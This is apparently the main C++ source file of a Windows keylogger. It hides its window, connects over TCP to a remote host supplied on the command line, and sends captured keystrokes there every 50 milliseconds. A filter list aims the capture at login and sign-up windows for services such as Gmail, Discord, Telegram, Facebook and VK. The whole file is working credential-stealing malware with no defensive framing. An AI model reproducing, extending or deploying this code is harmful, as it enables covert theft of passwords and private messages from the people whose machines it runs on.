#include "Keylogger.h"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:wmainCRTStartup")

std::vector<std::wstring> filters = { L"Discord", L"VK", L"Google", L"Yandex", L"Youtube", L"Gmail",
									  L"Telegram", L"Facebook", L"Viber", L"Authorization", L"Авторизация", L"Вход", L"Login", L"log in", L"sign up" };


int wmain(int argc, wchar_t* argv[]) {
	std::locale::global(std::locale("ru_RU.UTF-8"));

	auto client = new TcpClient(argv[1], argv[2], 128);
	
	while(!client->Connect(L"",L"")) {
		Sleep(1000);
	}

	Keylogger keylogger(client, new Filter(filters));
	
	SetTimer(NULL, 0, 50, NULL);
	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0)) {
		if (msg.message == WM_TIMER)
			keylogger.logKeys();
		if (msg.message == WM_CLOSE)
			keylogger.~Keylogger();
	}
		

	return 0;
}